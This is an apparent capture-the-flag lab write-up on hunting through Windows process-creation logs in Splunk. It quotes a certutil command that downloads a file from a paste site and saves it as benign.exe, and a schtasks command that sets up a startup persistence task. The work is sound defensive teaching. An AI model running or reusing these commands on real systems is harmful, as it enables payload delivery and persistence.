# Splunk Investigation – Compromised HR Host (Process Creation Logs)

**Scenario:** an IDS flagged suspicious process execution on a host in the **HR department**. Network information-gathering tools and scheduled tasks had been run, which confirmed the suspicion. Only **Windows Event ID 4688** (process creation) logs were available, and they were ingested into Splunk as `index=win_eventlogs`.

**Network context (departments and users):**

| Department | Users |
|---|---|
| IT | James, Moin, Katrina |
| HR | Haroon, Chris, Diana |
| Marketing | Bell, Amelia, Deepak |

Knowing who belongs where is what lets you tell normal activity from suspicious activity. For example, an HR user running admin-style tools stands out.

## Event ID 4688 and Useful Fields

| Field | Meaning |
|---|---|
| `EventID: 4688` | A new process was created |
| `CommandLine` | The exact command that was run (most valuable field) |
| `ProcessName` | The program that ran (e.g. `certutil.exe`) |
| `UserName` | Account that ran it |
| `HostName` | Machine it ran on (e.g. `HR_01`) |
| `EventTime` | When it ran |

## Investigation Steps

| Step | Search | What it showed |
|---|---|---|
| 1. See the data | `index=win_eventlogs` | 13,959 events in total (data starts 3/1/22) |
| 2. Count activity per user | `index=win_eventlogs Category="Process Creation" \| stats count by UserName` | 11 accounts. Almost all have about 1,100 to 1,350 events and `SYSTEM` has more, but one name is a **lookalike with only 1 event** |
| 3. Find scheduled task activity | `index=win_eventlogs schtasks` | 87 events, with 5 distinct command lines |
| 4. Hunt for unusual commands on HR hosts | `index=win_eventlogs HostName=HR_02 OR HostName=HR_01 OR HostName=HR_03 ProcessName="*.exe*" \| rare limit=20 CommandLine` | 4,797 events narrowed to the 20 **rarest** commands. A `certutil` download was at the top |
| 5. Pull that exact event | `index=win_eventlogs CommandLine="certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe"` | 1 event with the host, user, time and process |

## 1. Imposter Account
- The per-user count showed the real user **Amelia** (1,071 events) and a near-identical name, **Amella** (1 event)
- It swaps the letter **i** for **l**. That is a **lookalike (typosquatted) account**, designed to blend in
- A user with just **one event** in a sea of ~1,100 is a strong outlier

**Takeaway:** `stats count by UserName` is a quick way to spot odd usernames. Read names carefully for swapped characters.

## 2. Scheduled Task Abuse (`schtasks`)
`schtasks` is the built-in Windows task scheduler. Clicking the **CommandLine** field in Splunk lists its values and counts.

| Command (summary) | Count | Verdict |
|---|---|---|
| `/query /fo list /v` | 16 | Lists tasks. Common discovery or normal admin activity |
| `/change /tn "microsoft\office\office automatic updates" /enable` | 16 | Looks like routine Office behavior |
| `/delete /f /tn "...customer experience improvement program\uploader"` | 5 | Deleting a task, worth a note |
| `/create /tn OfficUpdater /tr "C:\Users\Chris.fort\AppData\Local\Temp\update.exe" /sc onstart` | **1** | **Suspicious** |

**Why the `/create` entry stands out:**
- Task name **`OfficUpdater`** is a misspelling of "Office Updater" (masquerading)
- It runs `update.exe` from a user's **Temp folder**, a common malware location
- `/sc onstart` runs it at every **startup**, which is **persistence**
- It's the **rarest** command (count 1) among the common ones

**HR user running scheduled tasks:** `Chris.fort`

## 3. LOLBIN Download (certutil)
**LOLBIN** = "Living Off the Land Binary": a legitimate, built-in Windows program abused by attackers. Here the tool is **`certutil.exe`** (normally used for certificates).

```
certutil.exe -urlcache -f - https://controlc.com/e4d11035 benign.exe
```

| Part | Meaning |
|---|---|
| `certutil.exe` | The trusted, Microsoft-signed binary |
| `-urlcache -f` | Download a file from a URL and force overwrite |
| `https://controlc.com/e4d11035` | Where it downloads from (a **third-party file/text sharing site**) |
| `benign.exe` | The **file name it was saved as** on the host (a harmless-sounding name) |

**Event details:**
- Host: `HR_01`, user: **Haroon** (HR), domain `cybertees.local`
- Date executed: **2022-03-04** at 10:38:28
- Process: `C:\Windows\System32\certutil.exe`, Event ID 4688

**How it was found:** `rare limit=20 CommandLine` lists the least common commands, and attacker commands are rarely repeated. Then searching that exact command line returned a single event, and the field panel gave the user, host and date.

## 4. Payload Content
Visiting the URL in a browser opened a text page named `flag.txt` containing the room's flag. In a real case, this is where you would **inspect the payload content** (without running it) to understand what was delivered.

## Findings Summary

| Item | Finding |
|---|---|
| Lookalike account | `Amella` (1 event), imitating `Amelia` |
| HR user running scheduled tasks | `Chris.fort` (`OfficUpdater` task with `update.exe` in Temp) |
| HR user using the LOLBIN download | `Haroon` on host `HR_01` |
| LOLBIN used | `certutil.exe` |
| Date executed | 2022-03-04 |
| Third-party site | `controlc.com` |
| Saved file name | `benign.exe` |
| URL contacted | `https://controlc.com/e4d11035` |

## Key Takeaways
- **`stats count by <field>`** quickly shows outliers (here, a username with a single event)
- **`rare limit=N <field>`** is great for hunting: attackers' commands are usually the rarest ones
- Click a field in Splunk's left panel to see its **values and counts** without writing a query
- **certutil with `-urlcache -f`** is a classic LOLBIN download. Combine it with the URL and output file name to learn what was fetched and where it was saved
- Watch for **masquerading**: lookalike usernames (`Amella`), fake task names (`OfficUpdater`) and harmless file names (`benign.exe`)
- A scheduled task launching an executable from **`AppData\Local\Temp`** at startup is a persistence red flag
- **Know the environment** (who's in HR, IT, Marketing) so unusual activity by a user or department stands out
